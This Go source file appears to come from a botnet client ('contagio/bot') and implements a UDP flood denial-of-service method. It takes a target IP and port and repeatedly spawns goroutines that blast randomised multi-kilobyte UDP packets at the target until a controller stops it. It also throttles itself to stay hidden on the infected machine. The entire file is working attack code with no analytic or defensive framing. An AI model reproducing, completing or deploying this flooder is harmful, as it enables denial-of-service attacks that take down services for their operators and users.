package methods

import (
	"contagio/bot/config"
	"contagio/bot/utils"
	"context"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"syscall"
	"time"
)

func UdpMethod(ctx context.Context, ipaddr string, _port string, id int, ch chan int) {
	defer Catch()

	if config.DEBUG {
		fmt.Println("[udpmix] Attack started")
	}

	port, err := strconv.Atoi(_port)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[udpmix atoi] Port atoi error: " + err.Error())
		}
		return
	}

	for {
		select {
		case <-ctx.Done():
			if config.DEBUG {
				fmt.Println("[udpmix] Attack stopped")
			}
			return
		case sid := <-ch:
			if id == sid {
				if config.DEBUG {
					fmt.Println("[udpmix] Attack stopped (by client)")
				}
				close(ch)
				return
			}
		case <-utils.StopChan:
			if config.DEBUG {
				fmt.Println("[udpmix] Cpu balancer")
			}
			time.Sleep(5 * time.Second)
		default:

			rand.NewSource(time.Now().UnixNano())

			payload := utils.BuildPayload(rand.Intn(3-1)+1, rand.Intn(7<<10-3<<10)+3<<10)

			go udp(net.ParseIP(ipaddr).To4(), port, payload)
			go udp(net.ParseIP(ipaddr).To4(), port, payload)
			go udp(net.ParseIP(ipaddr).To4(), port, payload)

			time.Sleep(150 * time.Millisecond)
		}
	}

}

func udp(ip net.IP, port int, payload []byte) {
	defer Catch()

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[udpmix flood] Can't open socket")
		}
		return
	}

	defer syscall.Close(fd)

	addr := syscall.SockaddrInet4{
		Port: port,
		Addr: [4]byte(ip),
	}

	for i := 0; i <= 20; i++ {
		syscall.Sendto(fd, payload, syscall.MSG_NOSIGNAL, &addr)
		time.Sleep(10 * time.Millisecond)
	}

}
